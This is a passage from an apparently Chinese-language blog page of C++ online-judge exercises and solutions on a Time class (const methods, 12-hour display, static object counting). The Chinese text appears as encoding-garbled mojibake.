&#125;;
/////////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;</code></pre>
<h3 id="29-æ—¶é—´ç±»çš„å¸¸é‡"><a href="#29-æ—¶é—´ç±»çš„å¸¸é‡" class="headerlink" title="29.æ—¶é—´ç±»çš„å¸¸é‡"></a>29.æ—¶é—´ç±»çš„å¸¸é‡</h3><blockquote>
<h2 id="Description-28"><a href="#Description-28" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\3. Time::Time(const T&amp;)æ‹·è´æ„é€ æ–¹æ³•ã€‚</p>
<p>\4. æˆå‘˜è¯»å‡½æ•°ï¼š</p>
<p>   Time::hour()  ï¼šè¿”å›Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute()ï¼šè¿”å›Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second()ï¼šè¿”å›Timeçš„ç§’æ•°ã€‚</p>
<p>\5. æˆå‘˜å†™å‡½æ•°ï¼š</p>
<p>   Time::hour(int)  ï¼šä¼ å‚ä¿®æ”¹Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„ç§’æ•°ã€‚</p>
<p>\6. å¯¹è±¡æ•´ä½“è¯»å†™æ–¹æ³•ï¼š</p>
<p>   Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’ä¸‰ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::setTime(const T&amp;)æ–¹æ³•ï¼šä¼ é€’ä¸€ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::getTime()æ–¹æ³•ï¼šè¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ã€‚å…¶å®ï¼Œt.getTime()å³tã€‚</p>
<p>   ä»…åœ¨Timeç±»ä¸­çš„Time::getTime()æ–¹æ³•å®åœ¨æ˜¯å¤šä½™ï¼Œåœ¨ç»„åˆæˆ–è€…ç»§æ‰¿å…³ç³»æ—¶æ‰ä¼šæœ‰æœºä¼šç”¨åˆ°ã€‚</p>
<p>\7. Time::inputTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>\8. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚</p>
<p>æ³¨æ„ï¼šä¸ºäº†ä¿è¯Timeç±»çš„å¸¸é‡å¯¹è±¡èƒ½å¤Ÿæ­£ç¡®çš„è°ƒç”¨Timeç±»çš„æ–¹æ³•ï¼Œé‚£äº›ä¸ä¿®æ”¹å¯¹è±¡æ•°æ®æˆå‘˜çš„å‡½æ•°éƒ½åº”è¯¥æ˜¯å¸¸é‡æˆå‘˜å‡½æ•°ï¼Œåœ¨è¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨æ—¶ä¹Ÿåº”è¿”å›å¸¸é‡å¼•ç”¨ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚main()å‡½æ•°å†…å®¹ç¨å¾®ç¹å¤ï¼Œä»…ä¸ºæµ‹è¯•å¯¹è±¡çš„å„ç§è°ƒç”¨æƒ…å†µã€‚</p>
<h2 id="Input-28"><a href="#Input-28" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ã€‚</p>
<h2 id="Output-28"><a href="#Output-28" class="headerlink" title="Output"></a>Output</h2><p>å¼€å§‹éƒ¨åˆ†ä¸ºç”±main()å‡½æ•°äº§ç”Ÿçš„å›ºå®šè¾“å‡ºï¼Œç”¨äºæµ‹è¯•å¯¹è±¡çš„æŸäº›æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚è¾“å‡ºâ€œTest data output :â€ä¹‹åä¸ºæµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºï¼š</p>
<p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ã€‚å¦‚æœè¾“å…¥çš„æ—¶é—´ä¸åˆæ³•ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-28"><a href="#Sample-Input-28" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-28"><a href="#Sample-Output-28" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Constant test output :00:00:0001:02:03Time errorTest data output :00:00:0100:59:59Time error23:00:0023:59:59Time error</p>
<h2 id="HINT-28"><a href="#HINT-28" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-28"><a href="#Append-Code-28" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1390&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
&#125;;

//////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Constant test output :&quot;&lt;&lt;endl;
    const Time c;
    const Time cc(1, 2, 3);
    const Time ccc(23, 60, 60);
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.hour()&lt;&lt;&quot;:&quot;;
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.minute()&lt;&lt;&quot;:&quot;;
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.second()&lt;&lt;endl;
    cc.getTime().showTime();
    ccc.showTime();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="30-æ—¶é—´ç±»çš„12å°æ—¶åˆ¶è¾“å‡º"><a href="#30-æ—¶é—´ç±»çš„12å°æ—¶åˆ¶è¾“å‡º" class="headerlink" title="30.æ—¶é—´ç±»çš„12å°æ—¶åˆ¶è¾“å‡º"></a>30.æ—¶é—´ç±»çš„12å°æ—¶åˆ¶è¾“å‡º</h3><blockquote>
<h2 id="Description-29"><a href="#Description-29" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒ24å°æ—¶åˆ¶å’Œ12å°æ—¶åˆ¶ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\3. Time::Time(const T&amp;)æ‹·è´æ„é€ æ–¹æ³•ã€‚</p>
<p>\4. æˆå‘˜è¯»å‡½æ•°ï¼š</p>
<p>   Time::hour()  ï¼šè¿”å›Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute()ï¼šè¿”å›Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second()ï¼šè¿”å›Timeçš„ç§’æ•°ã€‚</p>
<p>\5. æˆå‘˜å†™å‡½æ•°ï¼š</p>
<p>   Time::hour(int)  ï¼šä¼ å‚ä¿®æ”¹Timeçš„å°æ—¶æ•°ï¼›</p>
<p>   Time::minute(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„åˆ†é’Ÿæ•°ï¼›</p>
<p>   Time::second(int)ï¼šä¼ å‚ä¿®æ”¹Timeçš„ç§’æ•°ã€‚</p>
<p>\6. å¯¹è±¡æ•´ä½“è¯»å†™æ–¹æ³•ï¼š</p>
<p>   Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’ä¸‰ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::setTime(const T&amp;)æ–¹æ³•ï¼šä¼ é€’ä¸€ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::getTime()æ–¹æ³•ï¼šè¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ã€‚å…¶å®ï¼Œt.getTime()å³tã€‚</p>
<p>   ä»…åœ¨Timeç±»ä¸­çš„Time::getTime()æ–¹æ³•å®åœ¨æ˜¯å¤šä½™ï¼Œåœ¨ç»„åˆæˆ–è€…ç»§æ‰¿å…³ç³»æ—¶æ‰ä¼šæœ‰æœºä¼šç”¨åˆ°ã€‚</p>
<p>\7. Time::inputTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>\8. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚</p>
<p>\9. Time::showTime12Hour()æ–¹æ³•ï¼šè¾“å‡º12å°æ—¶åˆ¶çš„æ—¶é—´ï¼šä¸Šåˆè¾“å‡ºâ€œhh:mm:ss a.m.â€ã€ä¸‹åˆè¾“å‡ºâ€œhh:mm:ss p.m.â€ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚æ³¨æ„ï¼šè¯¥å‡½æ•°ä»…æ˜¾ç¤º12å°æ—¶åˆ¶æ—¶é—´ï¼Œå¹¶ä¸ä¿®æ”¹å¯¹è±¡çš„æ•°æ®æˆå‘˜ï¼Œå¯¹è±¡ä¾ç„¶å­˜å‚¨24å°æ—¶åˆ¶æ—¶é—´ã€‚</p>
<p>12å°æ—¶åˆ¶ä»¥æ•°å­—12ã€1ã€2ã€3ã€4ã€5ã€6ã€7ã€8ã€9ã€10ã€11ä¾æ¬¡åºè¡¨ç¤ºæ¯ä¸ªæ—¶æ®µçš„ã€‚</p>
<p>24å°æ—¶åˆ¶çš„00:00ï½00:59ï¼Œæ˜¯12å°æ—¶åˆ¶çš„12:00 a.m.ï½12:59 a.m.ï¼›</p>
<p>24å°æ—¶åˆ¶çš„1:00ï½11:59æ˜¯åäºŒå°æ—¶åˆ¶çš„1:00 a.m.ï½11:59 a.m.ã€‚</p>
<p>24å°æ—¶åˆ¶çš„12:00ï½12:59ï¼Œæ˜¯12å°æ—¶åˆ¶çš„12:00 p.m.ï½12:59 p.m.ï¼›</p>
<p>24å°æ—¶åˆ¶çš„13:00ï½23:59æ˜¯åäºŒå°æ—¶åˆ¶çš„1:00 p.m.ï½11:59 p.m.ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚main()å‡½æ•°å†…å®¹ç¨å¾®ç¹å¤ï¼Œä»…ä¸ºæµ‹è¯•å¯¹è±¡çš„å„ç§è°ƒç”¨æƒ…å†µã€‚</p>
<h2 id="Input-29"><a href="#Input-29" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ã€‚</p>
<h2 id="Output-29"><a href="#Output-29" class="headerlink" title="Output"></a>Output</h2><p>å¼€å§‹éƒ¨åˆ†ä¸ºç”±main()å‡½æ•°äº§ç”Ÿçš„å›ºå®šè¾“å‡ºï¼Œç”¨äºæµ‹è¯•å¯¹è±¡çš„æŸäº›æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚è¾“å‡ºâ€œTest data output :â€ä¹‹åä¸ºæµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºï¼š</p>
<p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºï¼Œå¥‡æ•°è¡Œçš„è¾“å…¥å¯¹åº”è¾“å‡º24å°æ—¶åˆ¶æ—¶é—´â€œhh:mm:ssâ€ï¼Œå¶æ•°è¡Œçš„è¾“å…¥å¯¹åº”è¾“å‡º12å°æ—¶åˆ¶æ—¶é—´ï¼šä¸Šåˆè¾“å‡ºâ€œhh:mm:ss a.m.â€ã€ä¸‹åˆè¾“å‡ºâ€œhh:mm:ss p.m.â€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ã€‚å¦‚æœè¾“å…¥çš„æ—¶é—´ä¸åˆæ³•ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-29"><a href="#Sample-Input-29" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-29"><a href="#Sample-Output-29" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Constant test output :11:59:58 a.m.12:00:01 p.m.11:59:5812:00:01Test data output :00:00:0112:59:59 a.m.Time error11:00:00 p.m.23:59:59Time error</p>
<h2 id="HINT-29"><a href="#HINT-29" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-29"><a href="#Append-Code-29" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1391&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    void showTime12Hour()const&#123;
        if(h &gt;= 1 &amp;&amp; h &lt; 12 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; a.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 0 &amp;&amp; h &lt; 1 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; &quot;12&quot; &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; a.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 12 &amp;&amp; h &lt; 13 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; &quot;12&quot; &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; p.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 13 &amp;&amp; h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h-12 &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; p.m.&quot; &lt;&lt; endl;            
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;            
    &#125;
&#125;;
/////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Constant test output :&quot;&lt;&lt;endl;
    const Time c(11, 59, 58);
    const Time cc(12, 0, 1);
    c.showTime12Hour();
    cc.showTime12Hour();
    c.showTime();
    cc.showTime();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime12Hour();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime12Hour();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="31-æ—¶é—´ç±»çš„é™æ€æˆå‘˜è®¡æ•°"><a href="#31-æ—¶é—´ç±»çš„é™æ€æˆå‘˜è®¡æ•°" class="headerlink" title="31.æ—¶é—´ç±»çš„é™æ€æˆå‘˜è®¡æ•°"></a>31.æ—¶é—´ç±»çš„é™æ€æˆå‘˜è®¡æ•°</h3><blockquote>
<h2 id="Description-30"><a href="#Description-30" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\3. Time::Time(const T&amp;)æ‹·è´æ„é€ æ–¹æ³•ã€‚</p>
<p>\4. å¯¹è±¡æ•´ä½“è¯»å†™æ–¹æ³•ï¼š</p>
<p>   Time::setTime(int,int,int)æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’ä¸‰ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::setTime(const T&amp;)æ–¹æ³•ï¼šä¼ é€’ä¸€ä¸ªå‚æ•°ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>   Time::getTime()æ–¹æ³•ï¼šè¿”å›å¯¹è±¡è‡ªèº«çš„å¼•ç”¨ã€‚å…¶å®ï¼Œt.getTime()å³tã€‚</p>
<p>   ä»…åœ¨Timeç±»ä¸­çš„Time::getTime()æ–¹æ³•å®åœ¨æ˜¯å¤šä½™ï¼Œåœ¨ç»„åˆæˆ–è€…ç»§æ‰¿å…³ç³»æ—¶æ‰ä¼šæœ‰æœºä¼šç”¨åˆ°ã€‚</p>
<p>\5. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚</p>
<p>\6. é™æ€æˆå‘˜æ–¹æ³•ï¼š</p>
<p>   Time::getNumber()æ–¹æ³•ï¼šè¿”å›ç¨‹åºä¸­å·²åˆ›å»ºçš„Timeå¯¹è±¡æ€»æ•°ã€‚</p>
<p>   Time::displayNumber()æ–¹æ³•ï¼šè¾“å‡ºç¨‹åºä¸­å·²åˆ›å»ºçš„Timeå¯¹è±¡æ€»æ•°ã€‚</p>
<p>æ³¨æ„ï¼šåœ¨ç”¨Timeå¯¹è±¡ä¼ é€’å‚æ•°æ—¶åº”ä¼ å¯¹è±¡çš„å¼•ç”¨è€Œä¸æ˜¯ç›´æ¥ä¼ å¯¹è±¡ï¼Œè¿”å›å¯¹è±¡æ—¶åŒæ ·è¿”å›å¼•ç”¨ï¼Œä»¥å…äº§ç”Ÿå¤šä½™çš„å¯¹è±¡æ‹·è´ã€‚å¤šä½™çš„æ‹·è´æ„é€ ä¼šå¼•èµ·å¯¹è±¡è®¡æ•°çš„é”™è¯¯ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚main()å‡½æ•°å†…å®¹ç¨å¾®ç¹å¤ï¼Œä»…ä¸ºæµ‹è¯•å¯¹è±¡çš„å„ç§è°ƒç”¨æƒ…å†µã€‚</p>
